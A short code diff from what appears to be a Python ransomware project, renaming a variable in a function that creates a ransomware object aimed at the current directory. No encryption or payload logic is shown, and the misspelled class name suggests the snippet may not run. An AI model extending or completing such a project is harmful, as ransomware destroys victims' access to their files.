@@ -110,9 +110,9 @@ class Ransomware:
 '''
 def initaite():
 	# Directory to encrypt
-	to_encyrpt = '.'
+	dir_to_encyrpt = '.'
 	# Instantiating Ransomware object
-	instance = Ransonware(directory=to_encyrpt)
+	instance = Ransonware(directory=dir_to_encyrpt)
 
 
 # Check if current module is main module
